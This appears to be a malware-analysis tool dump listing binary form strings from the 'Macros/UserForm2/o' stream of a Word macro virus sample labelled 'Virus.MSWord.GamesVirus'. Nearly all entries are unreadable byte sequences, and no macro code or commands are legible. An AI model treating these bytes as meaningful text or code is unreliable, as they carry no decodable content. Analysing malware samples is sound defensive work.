VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
F��9�����������������������������������������������������������������������������������������:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<9�9:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������������������������������핽�������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Õ��9����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�I0���I99��9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9990J
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
FKKJJF��J
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������Ö���������������������������������������������������������������������������::
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������������������������핕��򕽕򕕕�������������������Õ�9Õ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9�99:�:<9�9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9��90
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
FJ��B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�9������������Ö���������������������������������������������������������������������������::
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
::::�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������������������������������������򕕕�������Ó����������񕕕򕥥���9�å�9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
::99�0�N
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9<:99
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������������������������������������핕��Õ�����Ó��Ó���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9��99���Õ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�I��99�J:9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
IT���XB�AQ0Q�O
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������������������������������ܕ�����Õ������������FFF
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��9å��9�9999î
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
99�R9��9I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
FHIKQ<
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��JBP
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������������񽠜�������������������������������������������������������������:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�9�������������������������������������𕕕���򕕽���å�������������FÕ�9�Õ���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ERO�MB�9LHJ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������Ñ������������������������������������������������������������������������������::::
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9<:���99���������������������������������������ܕ���������Ó��������9��<9�Õ���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�9�IE
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�XK��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�X�J�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������򓑑��������é�������������������������������������������������������������������:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<9��������������������������������������𕕕�����Õ�����������Õ�Õ�999�9����F�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
99�9��9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���IN9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������񽓑���������ܩ��������������������������������������������������������������������:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9::�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������������������𕕕����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
FF����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����F������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
99�<99�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
99<9999
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
IFFKMT9�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������Ñ��������򩟸��������������������������������������������������������������������:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������������������������ý���������ÓÓ������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����999�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9�NI9QF0IQ<�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����Õ������������������Ó���������������������������������������������������������������������:::9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:������������������������������ý������Õ򕕕�������򓓓���<:�9�9��9��I��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BC<QF9FUIK
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�FE9<99
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����öÕ�����:Ñ���������������������������������������������������������������������������������:::
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������������������������������ý���������������Ó<<���Õ�9�9�9����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
WR9�ET
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
RB9FA
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������ý���񽑍����������������������������������������������������������������������������������:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9:9:����������������������������������������Õ�򕕕����������Ó��<<<������å�Õ�æ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������Óé��������������������������������������������������������������������:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:::������������������������������������������Õ�����������������:���<��æ����F
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
񕥮�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
R:9�QI�XF�KOOR
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
999�9�9�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9�����������������������������������������������������������������������������������������������������::::������������������������������������������Õ�����������������:<<�:<���9åF��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
T�Q9FXAKP�J
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
XMSRB
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BKKKKJJK�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9:����������������ýÎ������������������������������������������������������������������������������������������������������������������������������ý�����������������<:<:�<<:�<Õ�Õ��F�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9:<9F
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
IIKKF
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�9999999:��������������ýýÓ�������������������������������������������������������������������������������������������������������������������������������𕽕���������������:<�<<�<<<�<å����F�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�9��������������񶶽����������������������������������������������������������������������������������������������������������������������������������핕���������������<<<<<��<<9<<<񕥥
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0����������������������:::::::9�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9:::::9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N�������ö����Ñ��������������������������������������������������������������������������������������������������������������������������������������ܕ�����򕓓��������<<<�<�<<�<<<<�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�I�:��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9������������ö�������������������������F������������������������������������������������������������������������������������������������������������핕������Ó����������:�<�<<<9:<�<�9å��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9I�:����:����:��:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������/0:(-(09<:<�9:::::<�9:������򽽽������ý���������������򛜦���������������������������������������������������������������������������������������������������������������񕕕����������������<<:9:<<:<<��<9���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:09<:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:9(,)0((990(09:9(()<<
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
::�9��������������ý���Õ���������������������������������������������������������������������������������������������������������������������������������<�������<���:��:��::�<<�<�:<<�����9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:99999*Y*(90:0004000*((900<9</0:::::
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9���������ý����î��ýý���������򓩛��������������������������������������������������������������������������������������������������������������������::����<:<���::�::���:�<<<<9<�<�<��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�I�::::
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
90*(0*-**(0((***((/**49-,94*09:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9���������򕽽����Ó������������é������������������������������������������������������������������������������������������������������������������������:����:<���<��:<�<<::<�<::��<:<�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�I�:::
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:::(()0/Y*))
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
))),-)-..+,/(+,((9:0::
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9��������򽽕��������������������򩮩�����������������������������������������������������������������������������������������������������������������������������<������<:��<�::<�::<<:<<:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�I�::::
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:90()(9::::0*0000000*++,*-,(*,0::
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<�����������������:������������񓓓é������������������������������������������������������������������������������������������������������������������������<��:�::�����:����<::<���::�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:000(:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(/)((0((09:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9�������򽕽�ýöý�����������������Õ�������������������������������������������������������������������������������������������������������������������������::�::��:�<����:�:��<:<�<<<<<
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9�������������񑽽���������������������������������������������������������������������������������������������������������������������������������������������::::�:�:�:��:<�:��<�:<<<<<<
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�I9::
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0.)Y-.(*)--,+,0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9����ཽ�����������������ö���������������������������������������������������������������������������������������������������������������������������������������:��:���::�:�����::<��<:<�<
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
::0(-++(,+++-0::::::::::
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9:��������������ý����Õ��������������������������������������������������������������������������������������������������������������������������������������:�������:����:::::��:<<<<
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9���������ý��������������������������������������������������������������������������������:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
::�::J���������������������������������������������������������������::�<�������:::����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�99�9�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�9���9�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9����ܶýܽ��ý����������������������������������������������������������������������������::co::
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
o::����������������������������������������������������������������::<:�:����<�:���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
